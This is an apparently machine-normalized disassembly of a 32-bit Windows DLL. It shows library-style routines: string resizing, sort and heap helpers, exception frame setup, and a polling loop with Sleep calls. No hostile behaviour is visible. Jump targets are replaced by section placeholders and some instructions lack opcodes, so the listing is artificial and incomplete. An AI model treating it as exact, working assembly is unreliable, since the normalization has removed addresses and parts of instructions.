sub_10001010
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019c01
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_10001050
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_1001a060
add esp 0xc
pop ebp
retn
sub_10001080
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bcd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
call edx
sub_10001100
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bcf0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax ]
mov [ ebp - 0x4 ] 0x0
call edx
sub_100011a0
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
sub_100011d0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x10 ] edi
jge r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop ebx
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x10 ] edi
jl r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10001270
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1001a898
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_100012d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1001a898
lea eax [ ecx + ecx ]
push eax
call sub_1001a818
add esp 0x4
test eax eax
jne r-xdata
sub_10001330
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ ebx + ebx + 0x2 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
lea ebx [ ebx ]
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0xc ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x10 ]
jl r-xdata
dec esi
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ edi + ebx * 4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x18 ]
add esp 0x8
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
cmp esi eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ edi + ebx * 4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ edi + ebx * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100013f0
push ebp
mov ebp esp
push esi
xor eax eax
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x9249249
jbe r-xdata
pop edi
xor al al
pop esi
pop ebp
retn 0x4
push edi
lea ecx [ esi + 0xc ]
call sub_10001270
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
pop edi
mov [ esi + 0x8 ] edx
mov al 0x1
pop esi
pop ebp
retn 0x4
push r--data
call sub_100190f4
sub_10001450
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10019141
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_1001a060
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_100014e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bd10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_10019ba5
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_1001a898
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_100012d0
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_10019ce4
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_10019cf0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_10001626
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_1001a898
int3
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
sub_10001660
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bd30
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_100030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100016db
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1001a898
int3
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
sub_10001710
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
sub ecx edi
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
mov [ ebp + 0x8 ] ecx
test ebx ebx
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ ebx + ebx + 0x2 ]
jmp r-xdata
mov eax [ edi + ebx * 4 - 0x4 ]
dec ebx
sub esi 0x2
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] ebx
cmp esi ecx
jge r-xdata
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
push ebx
push eax
push edi
call sub_100011d0
add esp 0x14
test ebx ebx
jg r-xdata
mov edx [ edi + ecx * 4 - 0x4 ]
mov eax [ ebp + 0xc ]
dec ecx
mov [ edi + eax * 4 ] edx
mov [ ebp + 0xc ] ecx
mov ecx [ edi + esi * 4 - 0x4 ]
mov edx [ edi + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
pop esi
mov ecx [ ebp + 0xc ]
mov eax [ edi + esi * 4 ]
mov [ ebp + 0xc ] esi
lea esi [ esi + esi + 0x2 ]
mov [ edi + ecx * 4 ] eax
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
cmp esi ecx
sub_100017c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
lea ebx [ esi + 0x4 ]
cmp ebx eax
je r-xdata
pop ebx
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_1001a060
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov edi edi
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
pop edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test al al
jne r-xdata
sub_10001860
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
je r-xdata
mov eax [ esi ]
push ebx
mov ebx [ ebp + 0x10 ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
je r-xdata
mov edx [ edi ]
mov eax [ esi ]
mov [ esi ] edx
mov [ edi ] eax
mov eax [ edi ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
pop ebx
test al al
je r-xdata
mov edx [ esi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ esi ] eax
pop edi
pop esi
pop ebp
retn
mov edx [ edi ]
mov eax [ esi ]
mov [ esi ] edx
mov [ edi ] eax
sub_100018c0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
sub_10001910
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_10001660
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10001940
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
mov eax esi
sub eax ecx
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edx
push esi
push eax
push ecx
call sub_10001860
add esp 0x10
pop esi
mov esp ebp
pop ebp
retn
inc eax
cdq
and edx 0x7
add eax edx
push ebx
mov ebx [ ebp + 0x14 ]
sar eax 0x3
push edi
lea edx [ eax * 8 ]
mov [ ebp + 0x10 ] edx
push ebx
lea edi [ eax * 4 ]
add edx ecx
lea eax [ edi + ecx ]
push edx
push eax
push ecx
mov [ ebp - 0x4 ] eax
call sub_10001860
mov eax [ ebp + 0xc ]
push ebx
lea ecx [ edi + eax ]
push ecx
push eax
sub eax edi
push eax
call sub_10001860
push ebx
mov eax esi
sub eax edi
push esi
sub esi [ ebp + 0x10 ]
push eax
push esi
mov [ ebp + 0x8 ] eax
call sub_10001860
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
push ebx
push edx
push eax
push ecx
call sub_10001860
add esp 0x40
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
sub_100019e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10019141
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10001450
push ebx
push 0x0
mov ecx esi
call sub_10001450
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_100014e0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10001ae0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
push edi
sub eax esi
mov edi 0x3fffffff
sar eax 0x2
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x2
cmp eax edx
jbe r-xdata
push r--data
call sub_100190f4
pop edi
pop esi
pop ebp
retn 0x4
mov esi edx
shr esi 0x1
mov edi 0x3fffffff
sub edi esi
cmp edi edx
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10003360
mov edx eax
cmp edx eax
jae r-xdata
sub_10001b40
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ecx [ ecx ]
mov eax [ esi + 0x4 ]
pop edi
cmp eax ebx
je r-xdata
lea ebx [ ebx ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn
push eax
call sub_10019ce4
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_10019ce4
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
sub_10001bb0
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea esi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
push esi
push ebx
call sub_10001940
add esp 0x10
lea edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp ebx esi
jae r-xdata
cmp edi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx esi
mov edi edi
mov edi edi
mov eax [ esi - 0x4 ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ edi ]
mov ecx [ esi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ edi ]
mov edx [ esi ]
push ecx
push edx
call ebx
add esp 0x8
test al al
jne r-xdata
add esi 0xfffffffc
cmp ebx esi
jb r-xdata
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
add edi 0x4
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov edx [ esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
add edi 0x4
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ esi ]
mov edx [ esi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
sub ebx 0x4
cmp edi [ ebp + 0x10 ]
jne r-xdata
cmp edi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ edi ] ecx
mov edx [ esi ]
mov eax [ edi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test al al
jne r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
mov [ edi ] ecx
mov [ ebx ] eax
add edi 0x4
jmp r-xdata
sub esi 0x4
cmp ebx esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ esi - 0x4 ]
sub esi 0x4
mov [ esi ] ecx
mov [ ebx - 0x4 ] eax
cmp edi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ esi ]
sub eax 0x4
mov [ esi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ esi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ esi ] eax
mov ecx esi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax edi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add esi 0x4
add edi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ esi ]
mov [ esi ] edx
mov [ eax ] ecx
sub_10001d60
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x10 ]
push edi
jmp r-xdata
mov edx [ esi + eax - 0x4 ]
mov ecx [ esi ]
lea edi [ eax - 0x4 ]
mov [ esi + eax - 0x4 ] ecx
push ebx
mov [ ebp + 0xc ] edx
lea edx [ ebp + 0xc ]
push edx
mov eax edi
sar eax 0x2
push eax
push 0x0
push esi
call sub_10001330
mov eax edi
mov ecx edi
and ecx 0xfffffffc
add esp 0x14
cmp ecx 0x4
jg r-xdata
pop edi
pop ebx
sub_10001dc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bd60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] ebx
lea ecx [ ecx ]
push 0x1f4
call [ Sleep@IAT ]
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
xor esi esi
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
call sub_10001660
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
test al al
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
sub esp 0x8
mov edi esp
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x18 ] esp
test esi esi
je r-xdata
mov [ ebp - 0x14 ] 0x5
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
xor esi esi
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
call sub_10001660
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x28 ] esi
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ ebp - 0x24 ]
sub esp 0x8
mov edi esp
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x18 ] esp
test esi esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov esi [ ebp - 0x1c ]
mov edi edi
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov esi [ ebp - 0x24 ]
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x20 ]
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x10 ]
mov [ edi + 0x4 ] esi
mov [ edi ] ecx
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov ebx [ ebp - 0x10 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
